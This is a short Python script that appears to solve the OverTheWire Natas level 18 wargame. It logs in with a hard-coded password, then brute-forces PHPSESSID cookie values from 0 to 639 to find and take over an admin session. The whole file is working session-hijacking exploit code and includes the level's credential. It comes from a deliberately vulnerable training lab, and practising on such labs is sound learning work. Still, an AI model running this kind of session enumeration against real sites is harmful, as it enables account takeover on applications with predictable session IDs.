import requests

main = "http://natas18.natas.labs.overthewire.org"
index = "http://natas18.natas.labs.overthewire.org/index.php"

session = requests.Session()
session.auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
response = session.get(main)

for i in range(640):
    cookies = dict(PHPSESSID=str(i))
    response = session.get(index, cookies=cookies)
    if "Login as an admin to retrieve credentials" in response.text:
        pass
    else:
        print(response.text)
        break




    